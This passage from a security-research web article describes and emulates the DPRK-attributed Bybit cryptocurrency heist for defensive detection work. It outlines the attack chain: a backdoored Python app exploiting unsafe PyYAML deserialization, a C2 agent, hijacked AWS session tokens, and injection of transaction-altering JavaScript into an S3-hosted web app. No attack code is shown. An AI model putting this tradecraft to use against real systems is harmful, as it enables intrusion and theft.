<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist — Elastic Security Labs</title><meta name="description" content="A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots."/><meta property="og:title" content="Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist — Elastic Security Labs"/><meta property="og:description" content="A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/bit-bybit/bit-bybit.jpg?4d521aea93ba9ec52bfd787a689df74a"/><meta property="og:image:alt" content="A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/bit-bybit"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist — Elastic Security Labs"/><meta name="twitter:description" content="A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/bit-bybit/bit-bybit.jpg?4d521aea93ba9ec52bfd787a689df74a"/><meta name="twitter:image:alt" content="A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots."/><link rel="canonical" href="https://www.elastic.co/security-labs/bit-bybit"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-b3519b81ae876cf4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/sbHO_V6QtCJgh3oKZP6Tz/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/sbHO_V6QtCJgh3oKZP6Tz/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/bit-bybit"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/bit-bybit"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-05-06T00:00:00.000Z">6 May 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/colson-wilhoit">Colson Wilhoit</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/terrance-dejesus">Terrance DeJesus</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Bit ByBit -&nbsp; emulation of the DPRK's largest cryptocurrency&nbsp;heist</span></h1><p class="text-zinc-200 text-base md:text-xl">A high-fidelity emulation of the DPRK&#x27;s largest cryptocurrency heist via a compromised macOS developer and AWS pivots.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>40 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/attack-pattern">Attack pattern</a>, </span><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/detection-science">Detection science</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fbit-bybit%2Fbit-bybit.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h2>
<p>Key takeaways from this research:</p>
<ul>
<li>PyYAML was deserialization as initial access vector</li>
<li>The attack leveraged session token abuse and AWS lateral movement</li>
<li>Static site supply chain tampering</li>
<li>Docker-based stealth on macOS</li>
<li>End-to-end detection correlation with Elastic</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>On February 21, 2025, the crypto world was shaken when approximately 400,000 ETH vanished from ByBit —one of the industry’s largest cryptocurrency exchanges. Behind this incredible theft is believed to be North Korea’s elite cyber-offensive unit, referred to as <a href="https://www.ic3.gov/PSA/2025/PSA250226">TraderTraitor</a>. Exploiting a trusted vendor relationship with Safe{Wallet}, a multisig (multi-signature) wallet platform, TraderTraitor transformed a routine transaction into a billion-dollar heist. Supply chain targeting has become a hallmark of the DPRK’s cyber strategy, underpinning the regime’s theft of more than <a href="https://www.chainalysis.com/blog/crypto-hacking-stolen-funds-2025/">$6 billion</a> in cryptocurrency since 2017. In this article we’ll dissect this attack, carefully emulate its tactics within a controlled environment, and provide practical lessons to reinforce cybersecurity defenses using Elastic’s product and features.</p>
<p>Our emulation of this threat is based on research released by <a href="https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/">Sygnia</a>, <a href="https://x.com/safe/status/1897663514975649938">Mandiant/SAFE</a>, <a href="https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34">SlowMist</a>, and <a href="https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/">Unit42</a>.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="chronology-of-events" class="absolute -top-32"></span>Chronology of events</h2>
<p>If you&#x27;re here for the technical emulation details, feel free to skip ahead. But for context— and to clarify what was officially reported— we&#x27;ve compiled a high-level timeline of events to ground our assumptions based on the research referenced above.</p>
<p><strong>February 2, 2025</strong> – Infrastructure Setup</p>
<p>The attacker registers the domain getstockprice[.]com via Namecheap. This infrastructure is later used as the C2 endpoint in the initial access payload.</p>
<p><strong>February 4, 2025</strong> – Initial Compromise</p>
<p>Developer1’s macOS workstation is compromised after executing a malicious Python application. This application contained Docker-related logic and referenced the attacker’s domain. The file path (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/Downloads/</code>) and malware behavior suggest social engineering (likely via Telegram or Discord, consistent with past <a href="https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn">REF7001</a> and UNC4899 tradecraft).</p>
<p><strong>February 5, 2025</strong> – AWS Intrusion Begins</p>
<p>Attacker successfully accesses Safe{Wallet}’s AWS environment using Developer1’s active AWS session tokens.Attacker attempts (unsuccessfully) to register their own virtual MFA device to Developer1’s IAM user, indicating a persistence attempt.</p>
<p><strong>February 5–17</strong>: Reconnaissance activity begins within the AWS environment. During this time, attacker actions likely included the enumeration of IAM roles, S3 buckets, and other cloud assets.</p>
<p><strong>February 17, 2025</strong> – AWS Command and Control Activity</p>
<p>Confirmed C2 traffic observed in AWS. This marks the shift from passive reconnaissance to active staging of the attack.</p>
<p><strong>February 19, 2025</strong> – Web Application Tampering</p>
<p>A snapshot of app.safe.global (Safe{Wallet}’s statically hosted Next.js web app) captured by the Wayback Machine shows the presence of malicious JavaScript. The payload was crafted to detect a Bybit multisig transaction and modify it on-the-fly, redirecting funds to the attacker’s wallet.</p>
<p><strong>February 21, 2025</strong> – Execution and Cleanup</p>
<p>The exploit transaction is executed against Bybit via the compromised Safe{Wallet} frontend.</p>
<p>A new Wayback Machine snapshot confirms the JavaScript payload has been removed—indicating the attacker manually scrubbed it post-execution.</p>
<p>The Bybit heist transaction is finalized. Approximately 400,000 ETH is stolen. Subsequent analysis by Sygnia and others confirms that Bybit infrastructure was not directly compromised—Safe{Wallet} was the sole point of failure.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="assumptions-for-emulation" class="absolute -top-32"></span>Assumptions for emulation</h2>
<ul>
<li>Initial Social Engineering Vector:
Social engineering was employed to compromise Developer1, resulting in the execution of a malicious Python script. The exact details of the social engineering tactic (such as specific messaging, impersonation techniques, or the communication platform used) remain unknown.</li>
<li>Loader and Second-Stage Payload:
The malicious Python script executed a second-stage loader. It is currently unclear whether this loader and subsequent payloads match those detailed in Unit42&#x27;s reporting, despite alignment in the initial access Python application&#x27;s characteristics.</li>
<li>Safe Application Structure and Workflow:
The compromised application (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">app.global.safe</code>) appears to be a Next.js application hosted statically in AWS S3. However, specific details such as its exact routes, components, development processes, version control methods, and production deployment workflow are unknown.</li>
<li>JavaScript Payload Deployment:
While attackers injected malicious JavaScript into the Safe{Wallet} application, it is unclear whether this involved rebuilding and redeploying the entire application or merely overwriting/modifying a specific JavaScript file.</li>
<li>AWS IAM and Identity Management Details:
Details regarding Developer1’s IAM permissions, roles, and policy configurations within AWS are unknown. Additionally, whether Safe{Wallet} used AWS IAM Identity Center or alternative identity management solutions remains unclear.</li>
<li>AWS Session Token Retrieval and Usage:
While reports confirm the attackers used temporary AWS session tokens, details about how Developer1 originally retrieved these tokens (such as through AWS SSO, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetSessionToken</code>, or specific MFA configurations) and how they were subsequently stored or utilized (e.g., environment variables, AWS config files, custom scripts) are unknown.</li>
<li>AWS Enumeration and Exploitation Techniques:
The exact tools, enumeration methodologies, AWS API calls, and specific actions carried out by attackers within the AWS environment between February 5 and February 17, 2025, remain undisclosed.</li>
<li>AWS Persistence Mechanisms:
Although there is an indication of potential persistence within AWS infrastructure (e.g., via EC2 instance compromise), explicit details including tools, tactics, or persistence methods are not provided.</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="overview-of-the-attack" class="absolute -top-32"></span>Overview of the attack</h2>
<p>Targeting companies within the crypto ecosystem is a common occurrence. DPRK continually targets these companies due to the relative anonymity and decentralized nature of cryptocurrency, enabling the regime to evade global financial sanctions. North Korea&#x27;s offensive cyber groups excel at identifying and exploiting vulnerabilities, resulting in billions of dollars in losses.</p>
<p>This intrusion began with the <a href="https://x.com/safe/status/1897663514975649938?s=09">targeted compromise</a> of a developer&#x27;s MacOS workstation at Safe{Wallet}, ByBit’s trusted multi-signature wallet provider. Initial access involved social engineering, likely approaching the developer via platforms like LinkedIn, Telegram, or Discord, based on previous campaigns, and convincing them to download an archive file containing a crypto-themed Python application—an initial access procedure favored by DPRK. This Python application also included a Dockerized version of the application that could be run inside a privileged container. Unknown to the developer, this seemingly benign application enabled DPRK operators to exploit a remote code execution (RCE) <a href="https://www.cvedetails.com/cve/CVE-2017-18342/">vulnerability</a> in the PyYAML library, providing code execution capabilities and subsequently control over the host system.</p>
<p>After gaining initial access to the developer&#x27;s machine, attackers deployed <a href="https://github.com/its-a-feature/Mythic">MythicC2</a>&#x27;s <a href="https://github.com/MythicAgents/poseidon">Poseidon agent</a>, a robust Golang-based payload offering advanced stealth and extensive post-exploitation capabilities for macOS environments. The attackers then may have conducted reconnaissance, discovering the developer&#x27;s access to Safe{Wallet}’s AWS environment and the usage of temporary AWS user session tokens secured via multi-factor authentication (MFA). Armed with the developer&#x27;s AWS access key ID, secret key, and temporary session token, the threat actors then authenticated into Safe{Wallet}’s AWS environment within approximately 24 hours, capitalizing on the 12-hour validity of the session tokens.</p>
<p>Attempting to ensure persistent access to the AWS environment, the attackers tried to register their own MFA device. However, AWS temporary session tokens do not permit IAM API calls without <a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html#:~:text=You%20cannot%20call%20any%20IAM,in%20the%20IAM%20User%20Guide">MFA authentication context</a>, causing this attempt to fail. Following this minor setback, the threat actor enumerated the AWS environment, eventually discovering an S3 bucket hosting Safe{Wallet}&#x27;s static Next.js user interface.</p>
<p>The attackers could then have downloaded this Next.js application’s bundled code, spending nearly two weeks analyzing its functionality before injecting malicious JavaScript into the primary JS file and overwriting the legitimate version hosted in the S3 bucket. The malicious JavaScript code was activated exclusively on transactions initiated from Bybit’s cold wallet address and an attacker-controlled address. By inserting hardcoded parameters, the script circumvented transaction validation checks and digital signature verifications, effectively deceiving ByBit wallet approvers who implicitly trusted the Safe{Wallet} interface.</p>
<p>Shortly thereafter, the DPRK initiated a fraudulent transaction, triggering the malicious script to alter transaction details. This manipulation, likely, contributed to misleading the wallet signers into approving the illicit transfer, thereby granting DPRK operatives control of approximately 400,000 ETH. These stolen funds were then laundered into attacker-controlled wallets.</p>
<p>We chose to end our research and behavior emulation at the compromise of the Next.js application. Thus, we do not dive into the blockchain technologies, such as ETH smart contracts, contract addresses, and sweep ETH calls discussed in several other research publications.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="emulating-the-attack" class="absolute -top-32"></span>Emulating the attack</h2>
<p>To truly understand this breach we decided to emulate the entire attack chain in a controlled lab environment. As security researchers at Elastic, we wanted to walk in the footsteps of the attacker to understand how this operation unfolded at each stage: from code execution to AWS session hijacking and browser-based transaction manipulation.</p>
<p>This hands-on emulation served a dual purpose. First, it allowed us to analyze the attack at a granular, technical level to uncover practical detection and prevention opportunities. Second, it gave us the chance to test Elastic’s capabilities end-to-end—to see whether our platform could not only detect each phase of the attack, but also correlate them into a cohesive narrative that defenders could act on.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="macos-endpoint-compromise" class="absolute -top-32"></span>MacOS endpoint compromise</h3>
<p>Thanks to <a href="https://unit42.paloaltonetworks.com/">Unit42</a>’s detailed write-up—and more critically, uploading recovered samples to VirusTotal—we were able to emulate the attack end-to-end using the actual payloads observed in the wild. This included:</p>
<ul>
<li>PyYAML deserialization payload</li>
<li>Python loader script</li>
<li>Python stealer script</li>
</ul>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="malicious-python-application" class="absolute -top-32"></span>Malicious Python Application</h4>
<p>The initial access Python application we used in our emulation aligns with samples highlighted and shared by <a href="https://www.slowmist.com/">SlowMist</a> and corroborated by Mandiant&#x27;s <a href="https://x.com/safe/status/1897663514975649938">incident response findings</a> from the SAFE developer compromise. This application also matched the directory structure of the application shown by Unit42 in their write-up. Attackers forked a legitimate stock-trading Python project from GitHub and backdoored it within a Python script named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data_fetcher.py</code>.</p>
<p></p>
<p>The application leverages <a href="https://streamlit.io/">Streamlit</a> to execute <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">app.py</code>, which imports the script <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data_fetcher.py</code>.</p>
<p></p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">data_fetcher.py</code> script includes malicious functionality designed to reach out to an attacker-controlled domain.</p>
<p></p>
<p>The script, by default, fetches valid stock market-related data. However, based on specific conditions, the attacker-controlled server can return a malicious YAML payload instead. When evaluated using PyYAML’s unsafe loader (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">yaml.load()</code>), this payload allows for arbitrary Python object deserialization, resulting in RCE.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="pyyaml-deserialization-payload" class="absolute -top-32"></span>PyYAML Deserialization Payload</h4>
<p>(VT Hash: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">47e997b85ed3f51d2b1d37a6a61ae72185d9ceaf519e2fdb53bf7e761b7bc08f</code>)</p>
